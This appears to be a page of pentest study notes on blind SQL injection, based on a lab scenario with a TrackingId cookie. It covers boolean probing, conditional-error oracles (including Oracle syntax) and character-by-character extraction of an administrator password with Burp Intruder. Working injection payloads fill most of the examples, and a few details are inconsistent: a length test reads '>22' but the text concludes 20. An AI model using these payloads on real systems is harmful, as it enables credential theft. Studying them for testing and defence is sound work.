---
icon: equals
---

# BOOL

## <mark style="color:$primary;">ABOUT</mark>

Exploiting blind SQL injection by triggering conditional responses. Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:\
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

When a request containing a **TrackingId** cookie is processed, the application uses a SQL query to determine whether this is a known user:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized TrackingId, the query returns data and you receive a **"Welcome back"** message in the response.

## <mark style="color:$primary;">WHERE TO LOOK</mark>

The key difference between visible and blind SQL Injections is ability to see the output of your payloads, and where is it hidden. If there is some part of website which changes depending on the value your payload outputs (true / false), then you found the BLIND SQLi. But to exploit it you need to construct payload that way, so that indicator appearance is controlled.

## <mark style="color:$primary;">APPROACH</mark>

Blind SQL injection enumeration proceeds by isolating a single boolean predicate per request and observing a binary signal in the application response. Order is fixed: confirm injection point, confirm data source, then enumerate structure, then enumerate values, then enumerate value lengths and characters.

### <mark style="color:blue;">Probing</mark>

1. <mark style="color:orange;">**Confirm control over the query by appending a tautology and confirming a positive signal:**</mark>\
   `' AND '1'='1` Positive response proves injection.
2. <mark style="color:orange;">**Append a contradiction and confirm loss of the signal:**</mark> \
   `' AND '1'='2` Negative response proves boolean behavior.
3. <mark style="color:orange;">**Confirm presence of a table:**</mark> \
   `' AND (SELECT 'a' FROM users LIMIT 1)='a` If true, table exists and is readable.
4. <mark style="color:orange;">**Confirm presence of a row:**</mark> \
   `' AND (SELECT 'a' FROM users WHERE username='administrator')='a` True indicates the row exists.
5. <mark style="color:orange;">**Establish password length lower bound:**</mark> \
   `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a` True means length > 1.
6. <mark style="color:orange;">**Increase the threshold monotonically:**</mark>\
   &#x20;`>2` `>3` Continue until the condition flips to false. That index is the length boundary.

{% hint style="info" %}
Correct: the 'a' is just a constant chosen to turn a subquery into a simple boolean check — it makes the injected expression evaluate to either true (matches 'a') or false (does not), so the attacker gets a binary signal from the application’s response behavior.
{% endhint %}

## <mark style="color:$primary;">CONDITIONAL ERROR SQLi</mark>

This is a hybrid of error-based and blind SQL injections. It can happen when we can't see the output, but we can provoke an error, or make it controllable. When we have payload and with manipulating boolean values to get certain information step by step, it means we've made <mark style="color:orange;">**Binary Oracle.**</mark>

For understanding fully how this works you need to understand what is the order and logic behind SQL conditional operators. As simple example we'll use this payload:

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Here it seems exactly same, but the output by the application, would be different, so what's the logic here?

```sql
(SELECT CASE WHEN (condition1, possible) THEN (condition2, unequivocal) ELSE (safe exit)... END) = 'a'
```

Here condition1 (1=2 or 1=1) it's possible, that's where we put our command for searching certain parameters, but we should remember that output should be only true / false. If condition1 is TRUE, then request goes for THEN part, where we have unequivocal condition (1/0) which will always answer in ERROR. If our condition1 is FALSE, then we have 'a' so that request just has `'a' = 'a'` part, which will always be true and gives SQL engine ignore of that operation and absence of error.

## <mark style="color:$primary;">EXAMPLES</mark>

<details>

<summary>Password character extraction</summary>

#### " > a "

```sql
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'a
```

{% hint style="warning" %}
SUBSTRING operator may differ from SQL engine, in some it may look like SUBSTR
{% endhint %}

#### " = a "

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

#### Burp Password Extract

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Simple conditional error SQLi</summary>

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

If we would simplify logic, it's:&#x20;

SELECT (character extraction part) FROM Users. And further explanation of logic is in section of named vulnerability.

#### ORACLE

```sql
SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
```

The main difference here is just operators name: TO\_CHAR, NULL, FROM dual

</details>

<details>

<summary>Different concatenation methods and operators usage</summary>

Here you can see that there is not only type of operators to use:

```sql
'AND(SELECT NULL FROM users WHERE ROWNUM = 1) = 1 --
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

1. `AND` and `||` are different, but both can be used. `AND` injects boolean logic and `||` concatenates different strings into one
2. `''` and `NULL`
3. Concatenation methods are different, in first payload we concate our request like:\
   `value'AND (condition) -- asldkasldjasd, commented part of request` and in second payload it's less aggressive:\
   `value'||(condition)||'continuation of request, instead of commenting it`  which is less aggressive

</details>

<details>

<summary>Conditional error password extraction</summary>

#### Username confirmation

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
"Internal Error in case of true password"
```

#### Password length discovery

<pre class="language-sql"><code class="lang-sql">'||(SELECT CASE <a data-footnote-ref href="#user-content-fn-1">WHEN</a> (LENGTH(password)>22) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
"Changes HTTP Method after number 20, means password character number is 20"
</code></pre>

#### Character-by-character extraction

```sql
'||(SELECT CASE WHEN (SUBSTR(password,1,1)='d') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

"With paragraph signs for Burp Intruder:"
(SUBSTR(password,§1§,1)='§d§')
```

<figure><img src="../../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>



</details>

[^1]: 
